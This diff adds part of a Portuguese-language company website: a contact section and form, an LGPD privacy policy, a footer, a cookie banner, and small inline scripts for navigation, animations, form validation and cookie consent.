+            <h3>Informações de Contato</h3>
+            <p>Preencha o formulário ou utilize um dos canais abaixo.</p>
+
+            <div class="contact-item">
+              <div class="ci-icon"><i class="bi bi-envelope-fill"></i></div>
+              <div>
+                <h6>E-mail</h6>
+                <a href="mailto:waltersazinho@gmail.com">waltersazinho@gmail.com</a>
+              </div>
+            </div>
+
+            <div class="contact-item">
+              <div class="ci-icon"><i class="bi bi-telephone-fill"></i></div>
+              <div>
+                <h6>Telefone</h6>
+                <a href="tel:+5511982382923">(11) 98238-2923</a>
+              </div>
+            </div>
+
+            <div class="contact-item">
+              <div class="ci-icon"><i class="bi bi-whatsapp"></i></div>
+              <div>
+                <h6>WhatsApp</h6>
+                <a href="https://wa.me/5511982382923" target="_blank">(11) 98238-2923</a>
+              </div>
+            </div>
+
+            <div class="contact-item">
+              <div class="ci-icon"><i class="bi bi-geo-alt-fill"></i></div>
+              <div>
+                <h6>Endereço</h6>
+                <p>Avenida Naylor de Oliveira, 1710<br>Apt 12B - Cidade Tiradentes<br>São Paulo/SP - CEP 08470-800</p>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="col-lg-7 reveal">
+          <div class="contact-form">
+            <h3>Envie sua Mensagem</h3>
+            <p>Retornaremos o mais breve possível.</p>
+            <form id="contactForm" novalidate>
+              <div class="row g-3">
+                <div class="col-md-6">
+                  <div class="form-floating">
+                    <input type="text" class="form-control" id="nome" placeholder="Nome" required>
+                    <label for="nome"><i class="bi bi-person me-1"></i> Nome completo</label>
+                  </div>
+                </div>
+                <div class="col-md-6">
+                  <div class="form-floating">
+                    <input type="email" class="form-control" id="email" placeholder="E-mail" required>
+                    <label for="email"><i class="bi bi-envelope me-1"></i> E-mail</label>
+                  </div>
+                </div>
+                <div class="col-md-6">
+                  <div class="form-floating">
+                    <input type="tel" class="form-control" id="telefone" placeholder="Telefone">
+                    <label for="telefone"><i class="bi bi-telephone me-1"></i> Telefone</label>
+                  </div>
+                </div>
+                <div class="col-md-6">
+                  <div class="form-floating">
+                    <select class="form-select" id="assunto" required>
+                      <option value="" selected disabled>Selecione</option>
+                      <option>Dúvidas gerais</option>
+                      <option>Suporte técnico</option>
+                      <option>Comercial</option>
+                      <option>Privacidade de dados</option>
+                    </select>
+                    <label for="assunto"><i class="bi bi-tag me-1"></i> Assunto</label>
+                  </div>
+                </div>
+                <div class="col-12">
+                  <div class="form-floating">
+                    <textarea class="form-control" id="mensagem" placeholder="Mensagem" style="height: 140px" required></textarea>
+                    <label for="mensagem"><i class="bi bi-chat-left-text me-1"></i> Mensagem</label>
+                  </div>
+                </div>
+                <div class="col-12">
+                  <div class="form-check">
+                    <input class="form-check-input" type="checkbox" id="lgpd" required>
+                    <label class="form-check-label small text-muted" for="lgpd">
+                      Li e concordo com a <a href="#privacidade" class="text-decoration-none">Política de Privacidade</a>.
+                    </label>
+                  </div>
+                </div>
+                <div class="col-12">
+                  <button type="submit" class="btn-submit">
+                    <i class="bi bi-send me-2"></i> Enviar Mensagem
+                  </button>
+                </div>
+              </div>
+              <div id="formAlert" class="mt-3"></div>
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===== POLÍTICA DE PRIVACIDADE ===== -->
+  <section class="privacy-section" id="privacidade">
+    <div class="container">
+      <div class="text-center reveal">
+        <span class="section-label">Transparência</span>
+        <h2 class="section-title">Política de Privacidade</h2>
+        <p class="section-subtitle">
+          Sua privacidade é levada a sério. Conheça como tratamos seus dados pessoais.
+        </p>
+      </div>
+
+      <div class="privacy-card reveal">
+        <span class="privacy-date"><i class="bi bi-clock-history"></i> Última atualização: Outubro de 2026</span>
+
+        <div class="privacy-intro">
+          <p class="mb-0">
+            A <strong>Xou Portal e Provedor de Conteudo Na Internet LTDA</strong>, inscrita no CNPJ sob o nº <strong>42.971.737/0001-00</strong>, com sede na Avenida Naylor de Oliveira, 1710, Apt 12B, Cidade Tiradentes, São Paulo/SP, CEP 08470-800, está comprometida com a proteção da privacidade e dos dados pessoais de seus usuários, em conformidade com a Lei Geral de Proteção de Dados Pessoais (Lei nº 13.709/2018 - LGPD).
+          </p>
+        </div>
+
+        <h5><span class="num">1</span> Coleta de Informações</h5>
+        <p>Podemos coletar as seguintes categorias de informações:</p>
+        <ul>
+          <li><strong>Dados fornecidos pelo usuário:</strong> nome, e-mail, telefone e demais informações inseridas voluntariamente em formulários de contato ou cadastro.</li>
+          <li><strong>Dados de navegação:</strong> endereço IP, tipo de navegador, páginas visitadas, tempo de permanência e dados de cookies.</li>
+          <li><strong>Dados de comunicação:</strong> conteúdo de mensagens enviadas por e-mail, WhatsApp ou outros canais de atendimento.</li>
+        </ul>
+
+        <h5><span class="num">2</span> Finalidade do Tratamento</h5>
+        <p>Os dados pessoais coletados são utilizados para:</p>
+        <ul>
+          <li>Prestar os serviços de portal e provedor de conteúdo;</li>
+          <li>Responder a solicitações, dúvidas e solicitações de contato;</li>
+          <li>Melhorar a experiência do usuário e a qualidade dos serviços;</li>
+          <li>Cumprir obrigações legais e regulatórias;</li>
+          <li>Enviar comunicações informativas, mediante consentimento do titular.</li>
+        </ul>
+
+        <h5><span class="num">3</span> Base Legal</h5>
+        <p>O tratamento de dados pessoais realizado pela Xou fundamenta-se nas seguintes bases legais previstas na LGPD:</p>
+        <ul>
+          <li>Consentimento do titular (art. 7º, I);</li>
+          <li>Execução de contrato ou procedimentos preliminares (art. 7º, V);</li>
+          <li>Cumprimento de obrigação legal ou regulatória (art. 7º, II);</li>
+          <li>Legítimo interesse do controlador (art. 7º, IX).</li>
+        </ul>
+
+        <h5><span class="num">4</span> Compartilhamento de Dados</h5>
+        <p>A Xou não vende, aluga ou comercializa dados pessoais. O compartilhamento poderá ocorrer apenas com:</p>
+        <ul>
+          <li>Prestadores de serviços que auxiliam na operação do portal, mediante contratos de confidencialidade;</li>
+          <li>Autoridades públicas, quando exigido por lei ou ordem judicial;</li>
+          <li>Parceiros comerciais, mediante consentimento expresso do titular.</li>
+        </ul>
+
+        <h5><span class="num">5</span> Cookies e Tecnologias Similares</h5>
+        <p>Utilizamos cookies para melhorar a navegação, personalizar conteúdo e analisar o tráfego do site. O usuário pode gerenciar ou desabilitar os cookies nas configurações de seu navegador, ainda que isso possa impactar a experiência de uso.</p>
+
+        <h5><span class="num">6</span> Direitos do Titular</h5>
+        <p>Nos termos do art. 18 da LGPD, o titular dos dados pode exercer os seguintes direitos:</p>
+        <ul>
+          <li>Confirmação da existência de tratamento;</li>
+          <li>Acesso aos dados pessoais;</li>
+          <li>Correção de dados incompletos, inexatos ou desatualizados;</li>
+          <li>Anonimização, bloqueio ou eliminação de dados desnecessários ou excessivos;</li>
+          <li>Portabilidade dos dados a outro fornecedor;</li>
+          <li>Eliminação dos dados tratados com consentimento;</li>
+          <li>Informação sobre compartilhamento de dados;</li>
+          <li>Revogação do consentimento.</li>
+        </ul>
+        <p>Para exercer seus direitos, o titular pode entrar em contato pelo e-mail <a href="mailto:waltersazinho@gmail.com">waltersazinho@gmail.com</a>.</p>
+
+        <h5><span class="num">7</span> Segurança dos Dados</h5>
+        <p>A Xou adota medidas técnicas e administrativas adequadas para proteger os dados pessoais contra acessos não autorizados, perda, alteração ou destruição, incluindo criptografia, controle de acesso e monitoramento contínuo.</p>
+
+        <h5><span class="num">8</span> Retenção dos Dados</h5>
+        <p>Os dados pessoais serão armazenados apenas pelo tempo necessário ao cumprimento das finalidades para as quais foram coletados, observadas as obrigações legais de retenção.</p>
+
+        <h5><span class="num">9</span> Alterações nesta Política</h5>
+        <p>Esta Política de Privacidade pode ser atualizada periodicamente. Recomendamos que o usuário a revise regularmente. A data da última atualização será sempre indicada no início do documento.</p>
+
+        <h5><span class="num">10</span> Contato do Controlador</h5>
+        <p>Para dúvidas, solicitações ou reclamações relacionadas à privacidade e proteção de dados, entre em contato:</p>
+        <ul class="list-unstyled mt-3">
+          <li class="mb-2"><i class="bi bi-building text-primary me-2"></i> <strong>Xou Portal e Provedor de Conteudo Na Internet LTDA</strong></li>
+          <li class="mb-2"><i class="bi bi-hash text-primary me-2"></i> CNPJ: 42.971.737/0001-00</li>
+          <li class="mb-2"><i class="bi bi-geo-alt text-primary me-2"></i> Avenida Naylor de Oliveira, 1710, Apt 12B - Cidade Tiradentes - São Paulo/SP - CEP 08470-800</li>
+          <li class="mb-2"><i class="bi bi-envelope text-primary me-2"></i> <a href="mailto:waltersazinho@gmail.com">waltersazinho@gmail.com</a></li>
+          <li class="mb-2"><i class="bi bi-telephone text-primary me-2"></i> (11) 98238-2923</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===== FOOTER ===== -->
+  <footer class="footer">
+    <div class="container">
+      <div class="row g-4">
+        <div class="col-lg-4">
+          <div class="footer-brand">
+            <span class="logo-icon"><i class="bi bi-lightning-charge-fill"></i></span>
+            Xou
+          </div>
+          <p>
+            Portal e Provedor de Conteúdo na Internet. Conectando pessoas ao futuro digital com qualidade e segurança.
+          </p>
+          <div class="social-links">
+            <a href="mailto:waltersazinho@gmail.com" title="E-mail"><i class="bi bi-envelope-fill"></i></a>
+            <a href="https://wa.me/5511982382923" target="_blank" title="WhatsApp"><i class="bi bi-whatsapp"></i></a>
+            <a href="tel:+5511982382923" title="Telefone"><i class="bi bi-telephone-fill"></i></a>
+          </div>
+        </div>
+
+        <div class="col-lg-2 col-md-4 col-6">
+          <h5>Navegação</h5>
+          <ul>
+            <li><a href="#inicio"><i class="bi bi-chevron-right"></i> Início</a></li>
+            <li><a href="#empresa"><i class="bi bi-chevron-right"></i> Empresa</a></li>
+            <li><a href="#servicos"><i class="bi bi-chevron-right"></i> Serviços</a></li>
+            <li><a href="#contato"><i class="bi bi-chevron-right"></i> Contato</a></li>
+          </ul>
+        </div>
+
+        <div class="col-lg-2 col-md-4 col-6">
+          <h5>Legal</h5>
+          <ul>
+            <li><a href="#privacidade"><i class="bi bi-chevron-right"></i> Privacidade</a></li>
+            <li><a href="#privacidade"><i class="bi bi-chevron-right"></i> LGPD</a></li>
+            <li><a href="#privacidade"><i class="bi bi-chevron-right"></i> Cookies</a></li>
+          </ul>
+        </div>
+
+        <div class="col-lg-4">
+          <h5>Contato</h5>
+          <ul>
+            <li><a href="mailto:waltersazinho@gmail.com"><i class="bi bi-envelope"></i> waltersazinho@gmail.com</a></li>
+            <li><a href="tel:+5511982382923"><i class="bi bi-telephone"></i> (11) 98238-2923</a></li>
+            <li><a href="https://wa.me/5511982382923" target="_blank"><i class="bi bi-whatsapp"></i> WhatsApp</a></li>
+            <li><span style="color: rgba(255,255,255,0.7); font-size: 0.92rem;"><i class="bi bi-geo-alt"></i> São Paulo/SP - CEP 08470-800</span></li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="footer-bottom">
+        <p class="mb-1">
+          © 2026 <strong>Xou Portal e Provedor de Conteudo Na Internet LTDA</strong> · CNPJ: 42.971.737/0001-00
+        </p>
+        <p class="mb-0">
+          Todos os direitos reservados. · <a href="#privacidade">Política de Privacidade</a>
+        </p>
+      </div>
+    </div>
+  </footer>
+
+  <!-- ===== BANNER DE COOKIES ===== -->
+  <div class="cookie-banner" id="cookieBanner">
+    <div class="cookie-icon">🍪</div>
+    <div class="cookie-text">
+      <p>
+        Utilizamos cookies para melhorar sua experiência. Ao continuar navegando, você concorda com nossa
+        <a href="#privacidade">Política de Privacidade</a>.
+      </p>
+    </div>
+    <div class="cookie-actions">
+      <button class="btn-reject" onclick="cookieAction('rejected')">Recusar</button>
+      <button class="btn-accept" onclick="cookieAction('accepted')">Aceitar</button>
+    </div>
+  </div>
+
+  <!-- ===== BACK TO TOP ===== -->
+  <button class="back-to-top" id="backToTop" onclick="window.scrollTo({top: 0, behavior: 'smooth'})">
+    <i class="bi bi-arrow-up"></i>
+  </button>
+
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+  <script>
+    // ===== NAVBAR SCROLL =====
+    const nav = document.getElementById('mainNav');
+    const backTop = document.getElementById('backToTop');
+    window.addEventListener('scroll', () => {
+      if (window.scrollY > 50) {
+        nav.classList.add('scrolled');
+        backTop.classList.add('show');
+      } else {
+        nav.classList.remove('scrolled');
+        backTop.classList.remove('show');
+      }
+    });
+
+    // ===== REVEAL ANIMATIONS =====
+    const reveals = document.querySelectorAll('.reveal');
+    const revealObserver = new IntersectionObserver((entries) => {
+      entries.forEach((entry, i) => {
+        if (entry.isIntersecting) {
+          setTimeout(() => entry.target.classList.add('active'), i * 100);
+        }
+      });
+    }, { threshold: 0.1, rootMargin: '0px 0px -50px 0px' });
+    reveals.forEach(el => revealObserver.observe(el));
+
+    // ===== FECHAR MENU MOBILE AO CLICAR =====
+    document.querySelectorAll('.navbar-nav .nav-link').forEach(link => {
+      link.addEventListener('click', () => {
+        const navCollapse = document.getElementById('navMenu');
+        if (navCollapse.classList.contains('show')) {
+          new bootstrap.Collapse(navCollapse).hide();
+        }
+      });
+    });
+
+    // ===== FORMULÁRIO =====
+    document.getElementById('contactForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const nome = document.getElementById('nome').value.trim();
+      const email = document.getElementById('email').value.trim();
+      const assunto = document.getElementById('assunto').value;
+      const mensagem = document.getElementById('mensagem').value.trim();
+      const lgpd = document.getElementById('lgpd').checked;
+      const alertBox = document.getElementById('formAlert');
+
+      if (!nome || !email || !assunto || !mensagem || !lgpd) {
+        alertBox.innerHTML = `<div class="alert alert-warning border-0" role="alert">
+          <i class="bi bi-exclamation-triangle-fill me-2"></i> Por favor, preencha todos os campos obrigatórios e aceite a Política de Privacidade.
+        </div>`;
+        return;
+      }
+
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      if (!emailRegex.test(email)) {
+        alertBox.innerHTML = `<div class="alert alert-warning border-0" role="alert">
+          <i class="bi bi-exclamation-triangle-fill me-2"></i> Por favor, insira um e-mail válido.
+        </div>`;
+        return;
+      }
+
+      // Simulação de envio (substitua por integração real)
+      alertBox.innerHTML = `<div class="alert alert-success border-0" role="alert">
+        <i class="bi bi-check-circle-fill me-2"></i> <strong>Mensagem enviada!</strong> Obrigado ${nome}, retornaremos em breve.
+      </div>`;
+      this.reset();
+
+      setTimeout(() => { alertBox.innerHTML = ''; }, 8000);
+    });
+
+    // ===== COOKIES =====
+    const cookieBanner = document.getElementById('cookieBanner');
+    function cookieAction(action) {
+      localStorage.setItem('xou_cookies', action);
+      cookieBanner.classList.remove('show');
+    }
+    window.addEventListener('load', () => {
+      if (!localStorage.getItem('xou_cookies')) {
+        setTimeout(() => cookieBanner.classList.add('show'), 1500);
+      }
+    });
+
+    // ===== ANO DINÂMICO FOOTER =====
+    // (já está fixo como 2026, ajuste se necessário)
+  </script>
+</body>
+</html>
